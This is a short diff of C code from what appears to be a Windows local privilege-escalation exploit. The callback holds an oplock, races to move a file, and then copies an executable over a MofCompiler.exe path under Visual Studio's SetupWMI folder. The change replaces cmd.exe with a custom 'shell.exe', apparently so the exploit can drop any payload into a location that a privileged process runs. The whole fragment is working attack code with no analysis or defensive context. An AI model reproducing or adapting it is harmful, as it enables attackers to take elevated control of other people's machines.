@@ -184,7 +184,7 @@ void cb1()
     printf("[*] Oplock!\n");
     while (!Move(hFile2)) {}
     printf("[+] File moved!\n");
-    CopyFile(L"c:\\windows\\system32\\cmd.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
+    CopyFile(L"c:\\users\\emily\\documents\\shell.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
     finished = TRUE;
 }
 
